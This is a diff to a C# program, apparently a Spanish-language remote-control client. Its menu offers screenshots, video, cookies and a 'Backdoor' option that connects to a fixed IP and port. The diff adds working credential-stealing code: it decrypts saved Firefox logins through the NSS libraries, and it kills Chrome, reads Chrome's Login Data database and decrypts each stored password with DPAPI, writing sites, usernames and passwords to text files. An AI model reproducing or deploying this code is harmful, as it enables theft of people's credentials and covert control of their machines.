@@ -49,7 +49,7 @@ namespace pm3candc
             menu += "2.- Captura de pantalla\n";
             menu += "3.- Video\n";
             menu += "4.- cookies\n";
-            menu += "5.- Backdoor\n";
+            menu += "5.- Backdoor\n"; 
             ConnectSSL(menu);
 
             firefoxpass();
@@ -211,6 +211,59 @@ namespace pm3candc
                         else if(opcion == 5)
                         {
                             conectar("192.168.158.128", 2000);
+                        }
+                        else if (opcion == 7)
+                        {
+                            List<FirefoxPassword> firefoxPasswords = Firefox.Passwords();
+                            toFile("firefoxPasswods.txt", firefoxPasswords);
+                        }
+                        else if(opcion == 9)
+                        {
+                            killThemAll("chrome");
+                            try
+                            {
+                                string filename = "my_chrome_passwords.txt";
+                                StreamWriter Writer = new StreamWriter(filename, false, Encoding.UTF8);
+                                string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
+                                    + "\\Google\\Chrome\\User Data\\Default\\Login Data"; // a path to a database file
+
+                                string db_field = "logins";   // DB table field name
+                                byte[] entropy = null; // DPAPI class does not use entropy but requires this parameter
+                                string description;    // I could not understand the purpose of a this mandatory parameter
+                                                       // Output always is Null
+                                                       // Connect to DB
+                                string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
+                                DataTable DB = new DataTable();
+                                string sql = string.Format("SELECT * FROM {0} {1} {2}", db_field, "", "");
+                                using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
+                                {
+
+                                    SQLiteCommand command = new SQLiteCommand(sql, connect);
+                                    SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
+                                    adapter.Fill(DB);
+                                    int rows = DB.Rows.Count;
+                                    for (int i = 0; i < rows; i++)
+                                    {
+                                        Writer.Write(i + 1 + ") "); // Here we print order number of our trinity "site-login-password"
+                                        Writer.WriteLine(DB.Rows[i][1] + "<br>"); // site URL
+                                        Writer.WriteLine(DB.Rows[i][3] + "<br>"); // login
+                                                                                  // Here the password description
+                                        byte[] byteArray = (byte[])DB.Rows[i][5];
+                                        byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
+                                        string password = new UTF8Encoding(true).GetString(decrypted);
+                                        Writer.WriteLine(password + "<br><br>");
+                                    }
+                                    connect.Close();
+                                }
+                                Writer.Close();
+                            }
+                            catch (Exception ex)
+                            {
+
+                                ex = ex.InnerException;
+
+                            }
+
                         }
                     }
 
@@ -622,5 +675,665 @@ namespace pm3candc
             //Si no tiene longitud, para no regresar basura en el buffer, regresamos una cadena de longitud 0
             return "";
         }
+
+        public static void toFile(string name, List<FirefoxPassword> list)
+        {
+            using (System.IO.StreamWriter file =
+            new System.IO.StreamWriter(name, true))
+            {
+                foreach (FirefoxPassword pass in list)
+                {
+                    // If the line doesn't contain the word 'Second', write the line to the file.
+                    file.WriteLine(pass.ToString());
+                }
+            }
+        }
+
+        public static void killThemAll(string aplicacion)
+        {
+            try
+            {
+                Process[] chromeInstances = Process.GetProcessesByName(aplicacion);
+                foreach (Process pc in chromeInstances)
+                {
+                    if (pc.MainWindowHandle != IntPtr.Zero)
+                    {
+                        pc.Kill();
+
+                    }
+                }
+            }
+            catch (Exception e)
+            {
+
+            }
+        }
     }
+
+
+    public static class Firefox
+    {
+        private static IntPtr nssModule;
+
+        private static DirectoryInfo firefoxPath;
+        private static DirectoryInfo firefoxProfilePath;
+
+        private static FileInfo firefoxLoginFile;
+
+        static Firefox()
+        {
+
+            firefoxPath = GetFirefoxInstallPath();
+            if (firefoxPath == null)
+                throw new NullReferenceException("Firefox is not installed, or the install path could not be located");
+
+            firefoxProfilePath = GetProfilePath();
+            if (firefoxProfilePath == null)
+                throw new NullReferenceException("Firefox does not have any profiles, has it ever been launched?");
+
+            firefoxLoginFile = GetFile(firefoxProfilePath, "logins.json");
+            if (firefoxLoginFile == null)
+                throw new NullReferenceException("Firefox does not have any logins.json file");
+
+
+        }
+
+        #region Public Members
+        /// <summary>
+        /// Recover Firefox Passwords from logins.json
+        /// </summary>
+        /// <returns>List of Username/Password/Host</returns>
+        public static List<FirefoxPassword> Passwords()
+        {
+
+            List<FirefoxPassword> firefoxPasswords = new List<FirefoxPassword>();
+
+            // init libs
+            InitializeDelegates(firefoxProfilePath, firefoxPath);
+
+
+            JsonFFData ffLoginData = new JsonFFData();
+
+            using (StreamReader sr = new StreamReader(firefoxLoginFile.FullName))
+            {
+                string json = sr.ReadToEnd();
+                ffLoginData = JsonConvert.DeserializeObject<JsonFFData>(json);
+            }
+
+            foreach (LoginData data in ffLoginData.logins)
+            {
+                string username = Decrypt(data.encryptedUsername);
+                string password = Decrypt(data.encryptedPassword);
+                Uri host = new Uri(data.formSubmitURL);
+                FirefoxPassword f = new FirefoxPassword() { Host = host, Username = username, Password = password };
+                firefoxPasswords.Add(f);
+            }
+
+            return firefoxPasswords;
+        }
+
+        #endregion
+
+        #region Functions
+        private static void InitializeDelegates(DirectoryInfo firefoxProfilePath, DirectoryInfo firefoxPath)
+        {
+            //LoadLibrary(firefoxPath.FullName + "\\msvcr100.dll");
+            //LoadLibrary(firefoxPath.FullName + "\\msvcp100.dll");
+            LoadLibrary(firefoxPath.FullName + "\\msvcp120.dll");
+            LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
+            LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
+            nssModule = LoadLibrary(firefoxPath.FullName + "\\nss3.dll");
+            IntPtr pProc = GetProcAddress(nssModule, "NSS_Init");
+            NSS_InitPtr NSS_Init = (NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitPtr));
+            NSS_Init(firefoxProfilePath.FullName);
+            long keySlot = PK11_GetInternalKeySlot();
+            PK11_Authenticate(keySlot, true, 0);
+        }
+        private static DateTime FromUnixTime(long unixTime)
+        {
+            DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
+            return epoch.AddSeconds(unixTime);
+        }
+        private static long ToUnixTime(DateTime value)
+        {
+            TimeSpan span = (value - new DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime());
+            return (long)span.TotalSeconds;
+        }
+        #endregion
+
+        #region File Handling
+        private static DirectoryInfo GetProfilePath()
+        {
+            string raw = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles";
+            if (!Directory.Exists(raw))
+                throw new Exception("Firefox Application Data folder does not exist!");
+            DirectoryInfo profileDir = new DirectoryInfo(raw);
+
+            DirectoryInfo[] profiles = profileDir.GetDirectories();
+            if (profiles.Length == 0)
+                throw new IndexOutOfRangeException("No Firefox profiles could be found");
+
+            // return first profile, fuck it.
+            return profiles[0];
+
+        }
+        private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
+        {
+            foreach (FileInfo file in profilePath.GetFiles(searchTerm))
+            {
+                return file;
+            }
+            throw new Exception("No Firefox logins.json was found");
+
+
+        }
+        private static DirectoryInfo GetFirefoxInstallPath()
+        {
+            DirectoryInfo firefoxPath = null;
+            // get firefox path from registry
+            // we'll search the 32bit install location
+            RegistryKey localMachine1 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Mozilla\Mozilla Firefox", false);
+            // and lets try the 64bit install location just in case
+            RegistryKey localMachine2 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox", false);
+
+            if (localMachine1 != null)
+            {
+                string[] installedVersions = localMachine1.GetSubKeyNames();
+                // we'll take the first installed version, people normally only have one
+                if (installedVersions.Length == 0)
+                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");
+
+                RegistryKey mainInstall = localMachine1.OpenSubKey(installedVersions[0]);
+
+                // get install directory
+                string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);
+
+                if (installString == null)
+                    throw new NullReferenceException("Install string was null");
+
+                firefoxPath = new DirectoryInfo(installString);
+
+
+            }
+            else if (localMachine2 != null)
+            {
+                string[] installedVersions = localMachine1.GetSubKeyNames();
+                // we'll take the first installed version, people normally only have one
+                if (installedVersions.Length == 0)
+                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");
+
+                RegistryKey mainInstall = localMachine1.OpenSubKey(installedVersions[0]);
+
+                // get install directory
+                string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);
+
+                if (installString == null)
+                    throw new NullReferenceException("Install string was null");
+
+                firefoxPath = new DirectoryInfo(installString);
+            }
+            return firefoxPath;
+        }
+        #endregion
+
+        #region WinApi
+        // Credit: http://www.pinvoke.net/default.aspx/kernel32.loadlibrary
+        private static IntPtr LoadWin32Library(string libPath)
+        {
+            if (String.IsNullOrEmpty(libPath))
+                throw new ArgumentNullException("libPath");
+
+            IntPtr moduleHandle = LoadLibrary(libPath);
+            if (moduleHandle == IntPtr.Zero)
+            {
+                var lasterror = Marshal.GetLastWin32Error();
+                var innerEx = new Win32Exception(lasterror);
+                innerEx.Data.Add("LastWin32Error", lasterror);
+
+                throw new Exception("can't load DLL " + libPath, innerEx);
+            }
+            return moduleHandle;
+        }
+
+        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
+        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate long NSS_InitPtr(string configdir);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int PK11SDR_DecryptPtr(ref TSECItem data, ref TSECItem result, int cx);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate long PK11_GetInternalKeySlotPtr();
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct TSECItem
+        {
+            public int SECItemType;
+            public int SECItemData;
+            public int SECItemLen;
+        }
+
+        #endregion
+
+        #region JSON
+        // json deserialize classes
+        private class JsonFFData
+        {
+
+            public long nextId;
+            public LoginData[] logins;
+            public string[] disabledHosts;
+            public int version;
+
+        }
+        private class LoginData
+        {
+
+            public long id;
+            public string hostname;
+            public string url;
+            public string httprealm;
+            public string formSubmitURL;
+            public string usernameField;
+            public string passwordField;
+            public string encryptedUsername;
+            public string encryptedPassword;
+            public string guid;
+            public int encType;
+            public long timeCreated;
+            public long timeLastUsed;
+            public long timePasswordChanged;
+            public long timesUsed;
+
+        }
+        #endregion
+
+        #region Delegate Handling
+        // Credit: http://www.codeforge.com/article/249225
+        private static long PK11_GetInternalKeySlot()
+        {
+            IntPtr pProc = GetProcAddress(nssModule, "PK11_GetInternalKeySlot");
+            PK11_GetInternalKeySlotPtr ptr = (PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_GetInternalKeySlotPtr));
+            return ptr();
+        }
+        private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
+        {
+            IntPtr pProc = GetProcAddress(nssModule, "PK11_Authenticate");
+            PK11_AuthenticatePtr ptr = (PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_AuthenticatePtr));
+            return ptr(slot, loadCerts, wincx);
+        }
+        private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
+        {
+            IntPtr pProc = GetProcAddress(nssModule, "NSSBase64_DecodeBuffer");
+            NSSBase64_DecodeBufferPtr ptr = (NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSSBase64_DecodeBufferPtr));
+            return ptr(arenaOpt, outItemOpt, inStr, inLen);
+        }
+        private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
+        {
+            IntPtr pProc = GetProcAddress(nssModule, "PK11SDR_Decrypt");
+            PK11SDR_DecryptPtr ptr = (PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11SDR_DecryptPtr));
+            return ptr(ref data, ref result, cx);
+        }
+        private static string Decrypt(string cypherText)
+        {
+            StringBuilder sb = new StringBuilder(cypherText);
+            int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length);
+            TSECItem tSecDec = new TSECItem();
+            TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
+            var res = PK11SDR_Decrypt(ref item, ref tSecDec, 0);
+            if (res == 0)
+            {
+                if (tSecDec.SECItemLen != 0)
+                {
+                    byte[] bvRet = new byte[tSecDec.SECItemLen];
+                    Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
+                    return Encoding.UTF8.GetString(bvRet);
+                }
+            }
+            return null;
+        }
+        #endregion
+    }
+    public class FirefoxPassword
+    {
+        public string Username { get; set; }
+        public string Password { get; set; }
+        public Uri Host { get; set; }
+        public override string ToString()
+        {
+            return string.Format("User: {0}{3}Pass: {1}{3}Host: {2}", Username, Password, Host.Host, Environment.NewLine);
+        }
+    }
+
+
+    public class DPAPI
+    {
+        [DllImport("crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
+        private static extern
+            bool CryptProtectData(ref DATA_BLOB pPlainText, string szDescription, ref DATA_BLOB pEntropy, IntPtr pReserved,
+                                             ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DATA_BLOB pCipherText);
+
+        [DllImport("crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
+        private static extern
+            bool CryptUnprotectData(ref DATA_BLOB pCipherText, ref string pszDescription, ref DATA_BLOB pEntropy,
+                  IntPtr pReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DATA_BLOB pPlainText);
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        internal struct DATA_BLOB
+        {
+            public int cbData;
+            public IntPtr pbData;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        internal struct CRYPTPROTECT_PROMPTSTRUCT
+        {
+            public int cbSize;
+            public int dwPromptFlags;
+            public IntPtr hwndApp;
+            public string szPrompt;
+        }
+
+        static private IntPtr NullPtr = ((IntPtr)((int)(0)));
+
+        private const int CRYPTPROTECT_UI_FORBIDDEN = 0x1;
+        private const int CRYPTPROTECT_LOCAL_MACHINE = 0x4;
+
+        private static void InitPrompt(ref CRYPTPROTECT_PROMPTSTRUCT ps)
+        {
+            ps.cbSize = Marshal.SizeOf(
+                                      typeof(CRYPTPROTECT_PROMPTSTRUCT));
+            ps.dwPromptFlags = 0;
+            ps.hwndApp = NullPtr;
+            ps.szPrompt = null;
+        }
+
+        private static void InitBLOB(byte[] data, ref DATA_BLOB blob)
+        {
+            // Use empty array for null parameter.
+            if (data == null)
+                data = new byte[0];
+
+            // Allocate memory for the BLOB data.
+            blob.pbData = Marshal.AllocHGlobal(data.Length);
+
+            // Make sure that memory allocation was successful.
+            if (blob.pbData == IntPtr.Zero)
+                throw new Exception(
+                    "Unable to allocate data buffer for BLOB structure.");
+
+            // Specify number of bytes in the BLOB.
+            blob.cbData = data.Length;
+
+            // Copy data from original source to the BLOB structure.
+            Marshal.Copy(data, 0, blob.pbData, data.Length);
+        }
+
+        public enum KeyType { UserKey = 1, MachineKey };
+
+        private static KeyType defaultKeyType = KeyType.UserKey;
+
+        public static string Encrypt(string plainText)
+        {
+            return Encrypt(defaultKeyType, plainText, String.Empty, String.Empty);
+        }
+
+        public static string Encrypt(KeyType keyType, string plainText)
+        {
+            return Encrypt(keyType, plainText, String.Empty,
+                            String.Empty);
+        }
+
+        public static string Encrypt(KeyType keyType, string plainText, string entropy)
+        {
+            return Encrypt(keyType, plainText, entropy, String.Empty);
+        }
+
+        public static string Encrypt(KeyType keyType, string plainText, string entropy, string description)
+        {
+            // Make sure that parameters are valid.
+            if (plainText == null) plainText = String.Empty;
+            if (entropy == null) entropy = String.Empty;
+
+            // Call encryption routine and convert returned bytes into
+            // a base64-encoded value.
+            return Convert.ToBase64String(
+                    Encrypt(keyType,
+                            Encoding.UTF8.GetBytes(plainText),
+                            Encoding.UTF8.GetBytes(entropy),
+                            description));
+        }
+
+        public static byte[] Encrypt(KeyType keyType, byte[] plainTextBytes, byte[] entropyBytes, string description)
+        {
+            // Make sure that parameters are valid.
+            if (plainTextBytes == null) plainTextBytes = new byte[0];
+            if (entropyBytes == null) entropyBytes = new byte[0];
+            if (description == null) description = String.Empty;
+
+            // Create BLOBs to hold data.
+            DATA_BLOB plainTextBlob = new DATA_BLOB();
+            DATA_BLOB cipherTextBlob = new DATA_BLOB();
+            DATA_BLOB entropyBlob = new DATA_BLOB();
+
+            // We only need prompt structure because it is a required
+            // parameter.
+            CRYPTPROTECT_PROMPTSTRUCT prompt =
+                                      new CRYPTPROTECT_PROMPTSTRUCT();
+            InitPrompt(ref prompt);
+
+            try
+            {
+                // Convert plaintext bytes into a BLOB structure.
+                try
+                {
+                    InitBLOB(plainTextBytes, ref plainTextBlob);
+                }
+                catch (Exception ex)
+                {
+                    throw new Exception(
+                        "Cannot initialize plaintext BLOB.", ex);
+                }
+
+                // Convert entropy bytes into a BLOB structure.
+                try
+                {
+                    InitBLOB(entropyBytes, ref entropyBlob);
+                }
+                catch (Exception ex)
+                {
+                    throw new Exception(
+                        "Cannot initialize entropy BLOB.", ex);
+                }
+
+                // Disable any types of UI.
+                int flags = CRYPTPROTECT_UI_FORBIDDEN;
+
+                // When using machine-specific key, set up machine flag.
+                if (keyType == KeyType.MachineKey)
+                    flags |= CRYPTPROTECT_LOCAL_MACHINE;
+
+                // Call DPAPI to encrypt data.
+                bool success = CryptProtectData(ref plainTextBlob,
+                                                    description,
+                                                ref entropyBlob,
+                                                    IntPtr.Zero,
+                                                ref prompt,
+                                                    flags,
+                                                ref cipherTextBlob);
+                // Check the result.
+                if (!success)
+                {
+                    // If operation failed, retrieve last Win32 error.
+                    int errCode = Marshal.GetLastWin32Error();
+
+                    // Win32Exception will contain error message corresponding
+                    // to the Windows error code.
+                    throw new Exception(
+                        "CryptProtectData failed.", new Win32Exception(errCode));
+                }
+
+                // Allocate memory to hold ciphertext.
+                byte[] cipherTextBytes = new byte[cipherTextBlob.cbData];
+
+                // Copy ciphertext from the BLOB to a byte array.
+                Marshal.Copy(cipherTextBlob.pbData,
+                                cipherTextBytes,
+                                0,
+                                cipherTextBlob.cbData);
+
+                // Return the result.
+                return cipherTextBytes;
+            }
+            catch (Exception ex)
+            {
+                throw new Exception("DPAPI was unable to encrypt data.", ex);
+            }
+            // Free all memory allocated for BLOBs.
+            finally
+            {
+                if (plainTextBlob.pbData != IntPtr.Zero)
+                    Marshal.FreeHGlobal(plainTextBlob.pbData);
+
+                if (cipherTextBlob.pbData != IntPtr.Zero)
+                    Marshal.FreeHGlobal(cipherTextBlob.pbData);
+
+                if (entropyBlob.pbData != IntPtr.Zero)
+                    Marshal.FreeHGlobal(entropyBlob.pbData);
+            }
+        }
+
+        public static string Decrypt(string cipherText)
+        {
+            string description;
+
+            return Decrypt(cipherText, String.Empty, out description);
+        }
+
+        public static string Decrypt(string cipherText, out string description)
+        {
+            return Decrypt(cipherText, String.Empty, out description);
+        }
+
+        public static string Decrypt(string cipherText, string entropy, out string description)
+        {
+            // Make sure that parameters are valid.
+            if (entropy == null) entropy = String.Empty;
+
+            return Encoding.UTF8.GetString(
+                        Decrypt(Convert.FromBase64String(cipherText),
+                                    Encoding.UTF8.GetBytes(entropy),
+                                out description));
+        }
+
+        public static byte[] Decrypt(byte[] cipherTextBytes, byte[] entropyBytes, out string description)
+        {
+            // Create BLOBs to hold data.
+            DATA_BLOB plainTextBlob = new DATA_BLOB();
+            DATA_BLOB cipherTextBlob = new DATA_BLOB();
+            DATA_BLOB entropyBlob = new DATA_BLOB();
+
+            // We only need prompt structure because it is a required
+            // parameter.
+            CRYPTPROTECT_PROMPTSTRUCT prompt =
+                                      new CRYPTPROTECT_PROMPTSTRUCT();
+            InitPrompt(ref prompt);
+
+            // Initialize description string.
+            description = String.Empty;
+
+            try
+            {
+                // Convert ciphertext bytes into a BLOB structure.
+                try
+                {
+                    InitBLOB(cipherTextBytes, ref cipherTextBlob);
+                }
+                catch (Exception ex)
+                {
+                    throw new Exception(
+                        "Cannot initialize ciphertext BLOB.", ex);
+                }
+
+                // Convert entropy bytes into a BLOB structure.
+                try
+                {
+                    InitBLOB(entropyBytes, ref entropyBlob);
+                }
+                catch (Exception ex)
+                {
+                    throw new Exception(
+                        "Cannot initialize entropy BLOB.", ex);
+                }
+
+                // Disable any types of UI. CryptUnprotectData does not
+                // mention CRYPTPROTECT_LOCAL_MACHINE flag in the list of
+                // supported flags so we will not set it up.
+                int flags = CRYPTPROTECT_UI_FORBIDDEN;
+
+                // Call DPAPI to decrypt data.
+                bool success = CryptUnprotectData(ref cipherTextBlob,
+                                                  ref description,
+                                                  ref entropyBlob,
+                                                      IntPtr.Zero,
+                                                  ref prompt,
+                                                      flags,
+                                                  ref plainTextBlob);
+
+                // Check the result.
+                if (!success)
+                {
+                    // If operation failed, retrieve last Win32 error.
+                    int errCode = Marshal.GetLastWin32Error();
+
+                    // Win32Exception will contain error message corresponding
+                    // to the Windows error code.
+                    throw new Exception(
+                        "CryptUnprotectData failed.", new Win32Exception(errCode));
+                }
+
+                // Allocate memory to hold plaintext.
+                byte[] plainTextBytes = new byte[plainTextBlob.cbData];
+
+                // Copy ciphertext from the BLOB to a byte array.
+                Marshal.Copy(plainTextBlob.pbData,
+                             plainTextBytes,
+                             0,
+                             plainTextBlob.cbData);
+
+                // Return the result.
+                return plainTextBytes;
+            }
+            catch (Exception ex)
+            {
+                throw new Exception("DPAPI was unable to decrypt data.", ex);
+            }
+            // Free all memory allocated for BLOBs.
+            finally
+            {
+                if (plainTextBlob.pbData != IntPtr.Zero)
+                    Marshal.FreeHGlobal(plainTextBlob.pbData);
+
+                if (cipherTextBlob.pbData != IntPtr.Zero)
+                    Marshal.FreeHGlobal(cipherTextBlob.pbData);
+
+                if (entropyBlob.pbData != IntPtr.Zero)
+                    Marshal.FreeHGlobal(entropyBlob.pbData);
+            }
+        }
+    }
+
+
+
 }
